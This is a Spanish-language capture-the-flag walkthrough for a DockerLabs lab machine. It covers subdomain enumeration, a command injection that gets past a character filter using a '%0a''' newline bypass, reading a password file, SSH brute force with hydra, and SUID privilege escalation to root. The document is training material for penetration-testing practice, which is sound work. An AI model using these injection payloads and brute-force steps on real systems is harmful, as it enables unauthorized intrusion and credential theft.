---
title: "DockerLabs - Internal"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a la enumeración web y reconocimiento de servicios en red local.

## Despliegue

```bash
bash auto_deploy.sh internal.tar
```

## Reconocimiento

```bash
nmap -sV -p- 172.17.0.3
```

Apache redirige al dominio `internal.dl`. Añadir al `/etc/hosts`:

```bash
echo "172.17.0.3 internal.dl" >> /etc/hosts
```

## Enumeración de subdominios

```bash
gobuster vhost -u http://internal.dl -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -r
```

Se descubre: `backup.internal.dl`. Añadirlo:

```bash
# /etc/hosts
172.17.0.3 internal.dl backup.internal.dl
```

## Command Injection — backup.internal.dl

En `http://backup.internal.dl` el parámetro `dir` se pasa directamente a `ls -lah`. Filtra `;`, `|`, `&` — bypass con `%0a''`:

```bash
# Listar /opt
curl "http://backup.internal.dl/?action=backup&dir=/opt%0a''"

# Leer archivo de contraseñas
curl "http://backup.internal.dl/?action=backup&dir=/opt%0a''more%20/opt/.vault_pass.txt"
```

```bash
hydra -l vault -P found-passwords.txt ssh://172.17.0.3 -I -f -t 4
ssh vault@172.17.0.3
```

## Escalada de Privilegios

```bash
find / -perm -4000 -ls 2>/dev/null
# /usr/local/bin/vaultctl — SUID root, grupo vault
```

```bash
/usr/local/bin/vaultctl
whoami  # root
```

## Conclusión

Cadena de ataque: subdominio oculto → command injection con bypass `%0a''` → credenciales en `/opt/.vault_pass.txt` → SSH como `vault` → SUID binary `vaultctl` → root.
